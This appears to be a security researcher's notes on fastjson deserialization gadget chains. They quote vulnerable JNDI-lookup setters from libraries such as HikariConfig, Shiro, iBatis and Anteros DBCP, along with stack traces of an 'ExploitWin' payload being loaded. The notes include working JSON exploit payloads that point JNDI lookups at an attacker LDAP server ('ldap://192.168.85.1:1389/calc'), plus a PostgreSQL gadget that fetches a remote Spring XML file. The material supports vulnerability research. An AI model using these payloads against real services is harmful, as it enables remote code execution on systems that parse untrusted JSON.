### org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig
```java
    public HikariConfig() {
        this.dataSourceProperties = new Properties();
        this.healthCheckProperties = new Properties();
        this.minIdle = -1;
        this.maxPoolSize = -1;
        this.maxLifetime = MAX_LIFETIME;
        this.connectionTimeout = CONNECTION_TIMEOUT;
        this.validationTimeout = VALIDATION_TIMEOUT;
        this.idleTimeout = IDLE_TIMEOUT;
        this.initializationFailTimeout = 1L;
        this.isAutoCommit = true;
        String systemProp = System.getProperty("hikaricp.configurationFile");
        if (systemProp != null) {
            this.loadProperties(systemProp);
        }

    }
    
    public void setMetricRegistry(Object metricRegistry) {
        if (this.metricsTrackerFactory != null) {
            throw new IllegalStateException("cannot use setMetricRegistry() and setMetricsTrackerFactory() together");
        } else {
            if (metricRegistry != null) {
                if (metricRegistry instanceof String) {
                    try {
                        InitialContext initCtx = new InitialContext();
                        metricRegistry = initCtx.lookup((String)metricRegistry);
                    } catch (NamingException var3) {
                        throw new IllegalArgumentException(var3);
                    }
                }

                if (!(metricRegistry instanceof MetricRegistry)) {
                    throw new IllegalArgumentException("Class must be an instance of com.codahale.metrics.MetricRegistry");
                }
            }

            this.metricRegistry = metricRegistry;
        }
    }
    
    
    public void setHealthCheckRegistry(Object healthCheckRegistry) {
        if (healthCheckRegistry != null) {
            if (healthCheckRegistry instanceof String) {
                try {
                    InitialContext initCtx = new InitialContext();
                    healthCheckRegistry = initCtx.lookup((String)healthCheckRegistry);
                } catch (NamingException var3) {
                    throw new IllegalArgumentException(var3);
                }
            }

            if (!(healthCheckRegistry instanceof HealthCheckRegistry)) {
                throw new IllegalArgumentException("Class must be an instance of com.codahale.metrics.health.HealthCheckRegistry");
            }
        }

        this.healthCheckRegistry = healthCheckRegistry;
    }
```

### org.apache.shiro.realm.jndi.JndiRealmFactory
JndiRealmFactory.java
```java
    public JndiRealmFactory() {
    }

    public Collection<String> getJndiNames() {
        return this.jndiNames;
    }

    public void setJndiNames(Collection<String> jndiNames) {
        this.jndiNames = jndiNames;
    }

    public void setJndiNames(String commaDelimited) throws IllegalStateException {
        String arg = StringUtils.clean(commaDelimited);
        if (arg == null) {
            String msg = "One or more comma-delimited jndi names must be specified for the " + this.getClass().getName() + " to locate Realms.";
            throw new IllegalStateException(msg);
        } else {
            String[] names = StringUtils.tokenizeToStringArray(arg, ",");
            this.setJndiNames((Collection)Arrays.asList(names));
        }
    }

    public Collection<Realm> getRealms() throws IllegalStateException {
        Collection<String> jndiNames = this.getJndiNames();
        if (jndiNames != null && !jndiNames.isEmpty()) {
            List<Realm> realms = new ArrayList(jndiNames.size());
            Iterator i$ = jndiNames.iterator();

            while(i$.hasNext()) {
                String name = (String)i$.next();

                try {
                    Realm realm = (Realm)this.lookup(name, Realm.class);
                    realms.add(realm);
                } catch (Exception var6) {
                    throw new IllegalStateException("Unable to look up realm with jndi name '" + name + "'.", var6);
                }
            }

            return realms.isEmpty() ? null : realms;
        } else {
            String msg = "One or more jndi names must be specified for the " + this.getClass().getName() + " to locate Realms.";
            throw new IllegalStateException(msg);
        }
    }
```

org.apache.shiro.jndi.JndiLocator.java
```java
    protected Object lookup(String jndiName, Class requiredType) throws NamingException {
        if (jndiName == null) {
            throw new IllegalArgumentException("jndiName argument must not be null");
        } else {
            String convertedName = this.convertJndiName(jndiName);

            Object jndiObject;
            try {
                jndiObject = this.getJndiTemplate().lookup(convertedName, requiredType);
            } catch (NamingException var6) {
                if (convertedName.equals(jndiName)) {
                    throw var6;
                }

                if (log.isDebugEnabled()) {
                    log.debug("Converted JNDI name [" + convertedName + "] not found - trying original name [" + jndiName + "]. " + var6);
                }

                jndiObject = this.getJndiTemplate().lookup(jndiName, requiredType);
            }

            log.debug("Located object with JNDI name '{}'", convertedName);
            return jndiObject;
        }
    }
```

org.apache.shiro.jndi.JndiTemplate.java
```java
    public Object lookup(String name, Class requiredType) throws NamingException {
        Object jndiObject = this.lookup(name);
        if (requiredType != null && !requiredType.isInstance(jndiObject)) {
            String msg = "Jndi object acquired under name '" + name + "' is of type [" + jndiObject.getClass().getName() + "] and not assignable to the required type [" + requiredType.getName() + "].";
            throw new NamingException(msg);
        } else {
            return jndiObject;
        }
    }
    
    
    public Object lookup(final String name) throws NamingException {
        log.debug("Looking up JNDI object with name '{}'", name);
        return this.execute(new JndiCallback() {
            public Object doInContext(Context ctx) throws NamingException {
                Object located = ctx.lookup(name);
                if (located == null) {
                    throw new NameNotFoundException("JNDI object with [" + name + "] not found: JNDI implementation returned null");
                } else {
                    return located;
                }
            }
        });
    }
```

### org.apache.xbean.propertyeditor.JndiConverter
JndiConverter.java
```
public class JndiConverter extends AbstractConverter {
    public JndiConverter() {
        super(Context.class);
    }

    protected Object toObjectImpl(String text) {
        try {
            InitialContext context = new InitialContext();
            return (Context)context.lookup(text);
        } catch (NamingException var3) {
            throw new PropertyEditorException(var3);
        }
    }
}
```

AbstractConverter.java
```java
    public final void setAsText(String text) {
        Object value = this.toObject(this.trim ? text.trim() : text);
        super.setValue(value);
    }
    
    public final Object toObject(String text) {
        if (text == null) {
            return null;
        } else {
            Object value = this.toObjectImpl(this.trim ? text.trim() : text);
            return value;
        }
    }
    
    protected abstract Object toObjectImpl(String var1);
```

log:
```
org.apache.xbean.propertyeditor.PropertyEditorException: javax.naming.NamingException: problem generating object using object factory [Root exception is java.lang.ClassCastException: ExploitWin cannot be cast to javax.naming.spi.ObjectFactory]; remaining name 'calc'
	at org.apache.xbean.propertyeditor.JndiConverter.toObjectImpl(JndiConverter.java:37)
	at org.apache.xbean.propertyeditor.AbstractConverter.toObject(AbstractConverter.java:86)
	at org.apache.xbean.propertyeditor.AbstractConverter.setAsText(AbstractConverter.java:59)
	at com.alibaba.fastjson.parser.deserializer.FastjsonASMDeserializer_1_JndiConverter.deserialze(Unknown Source)
	at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:284)
```


### com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig
```java
    public JtaTransactionConfig() {
    }
    
    public void setProperties(Properties props) throws SQLException, TransactionException {
        String utxName = null;

        try {
            utxName = (String)props.get("UserTransaction");
            InitialContext initCtx = new InitialContext();
            this.userTransaction = (UserTransaction)initCtx.lookup(utxName);
        } catch (NamingException var4) {
            throw new SqlMapException("Error initializing JtaTransactionConfig while looking up UserTransaction (" + utxName + ").  Cause: " + var4);
        }
```

in poc by
```
    "properties": {
        "@type": "java.util.Properties",
        "UserTransaction": "ldap://192.168.85.1:1389/calc"
    }
```
setting this property `UserTransaction` as value `ldap://192.168.85.1:1389/calc`, for `JtaTransactionConfig#setProperties` to do
```java
utxName = (String)props.get("UserTransaction");
```


log:
```
com.ibatis.sqlmap.client.SqlMapException: Error initializing JtaTransactionConfig while looking up UserTransaction (ldap://192.168.85.1:1389/calc).  Cause: javax.naming.NamingException: problem generating object using object factory [Root exception is java.lang.ClassCastException: ExploitWin cannot be cast to javax.naming.spi.ObjectFactory]; remaining name 'calc'
	at com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig.setProperties(JtaTransactionConfig.java:49)
	at com.alibaba.fastjson.parser.deserializer.FastjsonASMDeserializer_1_JtaTransactionConfig.deserialze(Unknown Source)
	at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:284)
```




### org.apache.cocoon.components.slide.impl.JMSContentInterceptor
```java
    public JMSContentInterceptor() {
    }
    
    public void setParameters(Hashtable params) {
        super.setParameters(params);
        this.m_topicFactoryName = this.getParameter("topic-factory", "JmsTopicConnectionFactory");
        this.m_topicName = this.getParameter("topic", "topic1");
        boolean persistent = Boolean.valueOf(this.getParameter("persistent-delivery", "false"));
        this.m_deliveryMode = persistent ? 2 : 1;
        this.m_priority = Integer.valueOf(this.getParameter("priority", "4"));
        this.m_timeToLive = Long.valueOf(this.getParameter("time-to-live", "1000"));
        this.m_jndiProps = new Hashtable();
        this.m_jndiProps.put("java.naming.factory.initial", this.getParameter("java.naming.factory.initial", "org.exolab.jms.jndi.InitialContextFactory"));
        this.m_jndiProps.put("java.naming.provider.url", this.getParameter("java.naming.provider.url", "rmi://localhost:1099/"));
    }
    
    
    public void setNamespace(NamespaceAccessToken nat) {
        super.setNamespace(nat);

        try {
            Context context = new InitialContext(this.m_jndiProps);
            TopicConnectionFactory topicConnectionFactory = (TopicConnectionFactory)context.lookup(this.m_topicFactoryName);
            this.m_connection = topicConnectionFactory.createTopicConnection();
            this.m_connection.start();
            this.m_session = this.m_connection.createTopicSession(false, 3);
            this.m_topic = this.m_session.createTopic(this.m_topicName);
            this.m_publisher = this.m_session.createPublisher(this.m_topic);
            Thread t = new Thread(new Runnable() {
                public void run() {
                    JMSContentInterceptor.this.m_started = true;

                    while(JMSContentInterceptor.this.m_started) {
                        try {
                            Thread.sleep(1000L);
                        } catch (InterruptedException var6) {
                        }

                        if (JMSContentInterceptor.this.m_queue.size() != 0) {
                            List list = JMSContentInterceptor.this.m_queue;
                            JMSContentInterceptor.this.m_queue = Collections.synchronizedList(new ArrayList());
                            Iterator iter = list.iterator();

                            while(iter.hasNext()) {
                                String msg = (String)iter.next();
                                if (JMSContentInterceptor.this.getLogger().isEnabled(6)) {
                                    JMSContentInterceptor.this.getLogger().log("Sending message: " + msg, 6);
                                }

                                try {
                                    JMSContentInterceptor.this.m_publisher.publish(JMSContentInterceptor.this.m_session.createTextMessage(msg), JMSContentInterceptor.this.m_deliveryMode, JMSContentInterceptor.this.m_priority, JMSContentInterceptor.this.m_timeToLive);
                                } catch (JMSException var5) {
                                    JMSContentInterceptor.this.getLogger().log("Failure sending JMS message.", var5, "JMSContentInterceptor", 2);
                                }
                            }
                        }
                    }

                }
            });
            t.setPriority(5);
            t.start();
        } catch (NamingException var5) {
            this.getLogger().log("Failure while connecting to JMS server.", var5, "JMSContentInterceptor", 2);
        } catch (JMSException var6) {
            this.getLogger().log("Failure while connecting to JMS server.", var6, "JMSContentInterceptor", 2);
        }

    }
```

log:
```
com.alibaba.fastjson.JSONException: set property error, org.apache.cocoon.components.slide.impl.JMSContentInterceptor#namespace
	at com.alibaba.fastjson.parser.deserializer.FieldDeserializer.setValue(FieldDeserializer.java:162)
	at com.alibaba.fastjson.parser.deserializer.DefaultFieldDeserializer.parseField(DefaultFieldDeserializer.java:123)
	at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:838)
	at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.parseRest(JavaBeanDeserializer.java:1555)
	at com.alibaba.fastjson.parser.deserializer.FastjsonASMDeserializer_1_JMSContentInterceptor.deserialze(Unknown Source)
	at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:284)
  
...

Caused by: java.lang.reflect.InvocationTargetException
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:498)
	at com.alibaba.fastjson.parser.deserializer.FieldDeserializer.setValue(FieldDeserializer.java:110)
	... 136 more
Caused by: java.lang.NullPointerException
	at org.apache.cocoon.components.slide.impl.JMSContentInterceptor.getLogger(JMSContentInterceptor.java:283)
	at org.apache.cocoon.components.slide.impl.JMSContentInterceptor.setNamespace(JMSContentInterceptor.java:217)
	... 141 more
```

### br.com.anteros.dbcp.AnterosDBCPConfig
```java
    public AnterosDBCPConfig() {
        this.dataSourceProperties = new Properties();
        this.healthCheckProperties = new Properties();
        this.minIdle = -1;
        this.maxPoolSize = -1;
        this.maxLifetime = MAX_LIFETIME;
        this.connectionTimeout = CONNECTION_TIMEOUT;
        this.validationTimeout = VALIDATION_TIMEOUT;
        this.idleTimeout = IDLE_TIMEOUT;
        this.initializationFailTimeout = 1L;
        this.isAutoCommit = true;
        String systemProp = System.getProperty("hikaricp.configurationFile");
        if (systemProp != null) {
            this.loadProperties(systemProp);
        }

    }
    
    
    
    public void setHealthCheckRegistry(Object healthCheckRegistry) {
        this.checkIfSealed();
        if (healthCheckRegistry != null) {
            healthCheckRegistry = this.getObjectOrPerformJndiLookup(healthCheckRegistry);
            if (!(healthCheckRegistry instanceof HealthCheckRegistry)) {
                throw new IllegalArgumentException("Class must be an instance of com.codahale.metrics.health.HealthCheckRegistry");
            }
        }

        this.healthCheckRegistry = healthCheckRegistry;
    }
    
    
    
    private Object getObjectOrPerformJndiLookup(Object object) {
        if (object instanceof String) {
            try {
                InitialContext initCtx = new InitialContext();
                return initCtx.lookup((String)object);
            } catch (NamingException var3) {
                throw new IllegalArgumentException(var3);
            }
        } else {
            return object;
        }
    }
```

log:
```
java.lang.IllegalArgumentException: javax.naming.NamingException: problem generating object using object factory [Root exception is java.lang.ClassCastException: ExploitWin cannot be cast to javax.naming.spi.ObjectFactory]; remaining name 'Calc'
	at br.com.anteros.dbcp.AnterosDBCPConfig.getObjectOrPerformJndiLookup(AnterosDBCPConfig.java:1114)
	at br.com.anteros.dbcp.AnterosDBCPConfig.setHealthCheckRegistry(AnterosDBCPConfig.java:697)
	at com.alibaba.fastjson.parser.deserializer.FastjsonASMDeserializer_2_AnterosDBCPConfig.deserialze(Unknown Source)
	at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:284)
```


### org.apache.commons.proxy.provider.remoting.SessionBeanProvider

```java
public class SessionBeanProvider implements ObjectProvider {
    private final String jndiName;
    private final Class homeInterface;
    private final Properties properties;

    public SessionBeanProvider(String jndiName, Class homeInterface) {
        this.jndiName = jndiName;
        this.homeInterface = homeInterface;
        this.properties = null;
    }

    public Object getObject() {
        try {
            InitialContext initialContext = this.properties == null ? new InitialContext() : new InitialContext(this.properties);
            Object homeObject = PortableRemoteObject.narrow(initialContext.lookup(this.jndiName), this.homeInterface);
            Method createMethod = homeObject.getClass().getMethod("create", ProxyUtils.EMPTY_ARGUMENT_TYPES);
            return createMethod.invoke(homeObject, ProxyUtils.EMPTY_ARGUMENTS);
        } catch (NoSuchMethodException var4) {
            throw new ObjectProviderException("Unable to find no-arg create() method on home interface " + this.homeInterface.getName() + ".", var4);
        } catch (IllegalAccessException var5) {
            throw new ObjectProviderException("No-arg create() method on home interface " + this.homeInterface.getName() + " is not accessible.", var5);
        } catch (NamingException var6) {
            throw new ObjectProviderException("Unable to lookup EJB home object in JNDI.", var6);
        } catch (InvocationTargetException var7) {
            throw new ObjectProviderException("No-arg create() method on home interface " + this.homeInterface.getName() + " threw an exception.", var7);
        }
    }
    
}
```

log:
```
Caused by: javax.naming.NamingException: problem generating object using object factory [Root exception is java.lang.ClassCastException: ExploitWin cannot be cast to javax.naming.spi.ObjectFactory]; remaining name 'Calc'
	at com.sun.jndi.ldap.LdapCtx.c_lookup(LdapCtx.java:1092)
	at com.sun.jndi.toolkit.ctx.ComponentContext.p_lookup(ComponentContext.java:542)
	at com.sun.jndi.toolkit.ctx.PartialCompositeContext.lookup(PartialCompositeContext.java:177)
	at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205)
	at com.sun.jndi.url.ldap.ldapURLContext.lookup(ldapURLContext.java:94)
	at javax.naming.InitialContext.lookup(InitialContext.java:417)
	at org.apache.commons.proxy.provider.remoting.SessionBeanProvider.getObject(SessionBeanProvider.java:75)
```


### com.zaxxer.hikari.HikariConfig
```java
    public HikariConfig() {
        this.dataSourceProperties = new Properties();
        this.healthCheckProperties = new Properties();
        this.minIdle = -1;
        this.maxPoolSize = -1;
        this.maxLifetime = MAX_LIFETIME;
        this.connectionTimeout = CONNECTION_TIMEOUT;
        this.validationTimeout = VALIDATION_TIMEOUT;
        this.idleTimeout = IDLE_TIMEOUT;
        this.initializationFailTimeout = 1L;
        this.isAutoCommit = true;
        String systemProp = System.getProperty("hikaricp.configurationFile");
        if (systemProp != null) {
            this.loadProperties(systemProp);
        }

    }
    
    
    public void setHealthCheckRegistry(Object healthCheckRegistry) {
        this.checkIfSealed();
        if (healthCheckRegistry != null) {
            healthCheckRegistry = this.getObjectOrPerformJndiLookup(healthCheckRegistry);
            if (!(healthCheckRegistry instanceof HealthCheckRegistry)) {
                throw new IllegalArgumentException("Class must be an instance of com.codahale.metrics.health.HealthCheckRegistry");
            }
        }

        this.healthCheckRegistry = healthCheckRegistry;
    }
    
    private Object getObjectOrPerformJndiLookup(Object object) {
        if (object instanceof String) {
            try {
                InitialContext initCtx = new InitialContext();
                return initCtx.lookup((String)object);
            } catch (NamingException var3) {
                throw new IllegalArgumentException(var3);
            }
        } else {
            return object;
        }
    }
```

log:
```
java.lang.IllegalArgumentException: javax.naming.NamingException: problem generating object using object factory [Root exception is java.lang.ClassCastException: ExploitWin cannot be cast to javax.naming.spi.ObjectFactory]; remaining name 'Calc'
	at com.zaxxer.hikari.HikariConfig.getObjectOrPerformJndiLookup(HikariConfig.java:1112)
	at com.zaxxer.hikari.HikariConfig.setHealthCheckRegistry(HikariConfig.java:695)
	at com.alibaba.fastjson.parser.deserializer.FastjsonASMDeserializer_1_HikariConfig.deserialze(Unknown Source)
	at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:284)
```


### commons-io

2.4版本的log
```
Exception in thread "main" java.lang.NullPointerException
	at org.apache.commons.io.output.WriterOutputStream.processInput(WriterOutputStream.java:280)
	at org.apache.commons.io.output.WriterOutputStream.write(WriterOutputStream.java:213)
	at org.apache.commons.io.output.WriterOutputStream.write(WriterOutputStream.java:241)
	at org.apache.commons.io.input.TeeInputStream.read(TeeInputStream.java:110)
	at org.apache.commons.io.input.BOMInputStream.getBOM(BOMInputStream.java:218)
	at com.alibaba.fastjson.serializer.ASMSerializer_3_BOMInputStream.write(Unknown Source)
	at com.alibaba.fastjson.serializer.MapSerializer.write(MapSerializer.java:271)
	at com.alibaba.fastjson.serializer.MapSerializer.write(MapSerializer.java:44)
	at com.alibaba.fastjson.serializer.JSONSerializer.write(JSONSerializer.java:285)
	at com.alibaba.fastjson.JSON.toJSONString(JSON.java:973)
	at com.alibaba.fastjson.JSON.toString(JSON.java:967)
	at com.alibaba.fastjson.JSONObject.getString(JSONObject.java:325)
	at com.alibaba.fastjson.serializer.MiscCodec.deserialze(MiscCodec.java:279)
	at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:395)
	at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:565)
	at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1401)
	at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1367)
	at com.alibaba.fastjson.JSON.parse(JSON.java:183)
	at com.alibaba.fastjson.JSON.parse(JSON.java:193)
	at com.alibaba.fastjson.JSON.parse(JSON.java:149)
	at com.alibaba.fastjson.JSON.parseObject(JSON.java:254)
	at com.cqq.fastjsonPOC.TestCommonsIO.main(TestCommonsIO.java:210)
```
2.6版本的log：
```
Exception in thread "main" com.alibaba.fastjson.JSONException: create instance error, null, public org.apache.commons.io.output.WriterOutputStream(java.io.Writer,java.nio.charset.Charset,int,boolean)
	at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:1016)
	at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:288)
	at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:284)
	at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:808)
	at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:288)
	at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:284)
	at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:395)
	at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:565)
	at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:565)
	at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1401)
	at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1367)
	at com.alibaba.fastjson.serializer.MiscCodec.deserialze(MiscCodec.java:261)
	at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:395)
	at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:565)
	at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1401)
	at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1367)
	at com.alibaba.fastjson.JSON.parse(JSON.java:183)
	at com.alibaba.fastjson.JSON.parse(JSON.java:193)
	at com.alibaba.fastjson.JSON.parse(JSON.java:149)
	at com.alibaba.fastjson.JSON.parseObject(JSON.java:254)
	at com.cqq.fastjsonPOC.TestCommonsIO.main(TestCommonsIO.java:210)
Caused by: java.lang.reflect.InvocationTargetException
	at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)
	at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62)
	at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)
	at java.lang.reflect.Constructor.newInstance(Constructor.java:423)
	at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:1012)
	... 20 more
Caused by: java.lang.NullPointerException
	at org.apache.commons.io.output.WriterOutputStream.<init>(WriterOutputStream.java:144)
	... 25 more
```

postgresql的gadget：
```
{
    "@type": "java.lang.AutoCloseable",
    "@type": "org.postgresql.jdbc.PgConnection",
    "hostSpecs": [{
        "host": "127.0.0.1",
        "port": 2333
    }],
    "user": "test",
    "database": "test",
    "info": {
        "socketFactory": "org.springframework.context.support.ClassPathXmlApplicationContext",
        "socketFactoryArg": "http://x.y.z.208:8888/test.xml"
    },
    "url": ""
}
```
![image](https://user-images.githubusercontent.com/30398606/209430315-a2d4bd68-ee07-49ea-856c-c37b8fcb698b.png)

![image](https://user-images.githubusercontent.com/30398606/209432505-cdcdc136-be4f-4e11-b0cd-25acea65a828.png)

但是`ClassPathXmlApplicationContext`因为不是`java.net.SocketFactory`的子类，而失败。
